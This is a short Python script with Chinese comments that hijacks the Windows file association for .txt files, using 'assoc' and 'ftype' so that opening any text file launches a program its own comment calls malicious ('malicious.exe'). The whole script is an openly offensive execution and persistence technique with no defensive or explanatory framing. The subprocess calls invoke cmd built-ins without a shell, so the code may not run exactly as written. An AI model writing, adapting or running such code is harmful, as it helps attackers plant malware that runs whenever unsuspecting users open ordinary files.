import subprocess

# 執行惡意程式的程式路徑
malicious_program = "C:\\path\\to\\malicious.exe"

def set_file_association(extension):
    subprocess.run(["assoc", ".{}".format(extension), "MyCustomFileType"])
    subprocess.run(["ftype", "MyCustomFileType", "{} %1".format(malicious_program)])

# 使用範例
set_file_association("txt")